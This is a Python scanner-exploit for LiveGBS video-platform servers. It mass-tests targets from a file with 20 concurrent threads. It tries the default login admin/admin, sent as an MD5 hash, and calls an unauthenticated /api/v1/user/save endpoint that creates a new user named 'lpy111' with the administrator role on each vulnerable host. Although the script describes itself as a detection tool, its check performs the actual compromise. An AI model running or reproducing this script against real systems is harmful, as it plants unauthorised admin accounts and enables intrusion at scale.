import requests
import argparse
import concurrent.futures


def checkLogin(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    }

    data = {"username": "admin", "password": "21232f297a57a5a743894a0e4a801fc3"}
    try:
        res = requests.post(f"{url}/login", headers=headers, json=data, timeout=5, verify=False)
        if res.status_code == 200 and res.text:
            if "成功" in res.text:
                print(f"[+] {url} 登陆成功! username:admin&password:admin")
                return True
            else:
                print(f"[-] {url} 不存在弱口令!")
        else:
            print(f"[-] {url} 不存在弱口令!")
    except Exception as e:
        print(f"\033[1;31m[-] {url} 连接出错! {e}\033[0m")
    return False


def check_save(url):
    header = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
    }

    try:
        res = requests.get(f"{url}/api/v1/user/save?ID=&Username=lpy111&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true",
                           headers=header)
        if res.status_code == 200:
            print(
                f"[+] {url}/api/v1/user/save?ID=&Username=lpy111&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true 存在添加用户漏洞")
            return True
        else:
            print(f"[-] {url} 不存在添加用户漏洞")
    except Exception as e:
        print(f"\033[1;31m[-] {url} 连接出错! {e}\033[0m")
    return False


def banner():
    print("""
  _      _            _____ ____   _____ 
 | |    (_)          / ____|  _ \ / ____|
 | |     ___   _____| |  __| |_) | (___  
 | |    | \\ \\ / / _ \\ | |_ |  _ < \\___ \\ 
 | |____| |\\ V /  __/ |__| | |_) |____) |
 |______|_| \\_/ \\___|\\_____|____/|_____/ 

                                                                        By:lpy             
    """)
    print("--author:Thejoyofgettingusedtolife  联系方式：liuhangtong527@gmail.com".rjust(100, " "))

def check_target(url):
    # 检查登录漏洞
    checkLogin(url)

    # 检查添加用户漏洞
    check_save(url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="这是一个LiveGBS-添加用户-save检测程序")
    parser.add_argument("-u", "--url", type=str, help="需要检测的URL")
    parser.add_argument("-f", "--file", type=str, help="指定批量检测文件")
    args = parser.parse_args()

    if args.url:
        banner()
        check_target(args.url)
    elif args.file:
        banner()
        with open(args.file, 'r') as f:
            targets = f.read().splitlines()

        # 使用线程池并发执行检查漏洞
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_target, targets)
    else:
        banner()
        print("-u, --url 指定需要检测的URL")
        print("-f, --file 指定需要批量检测的文件")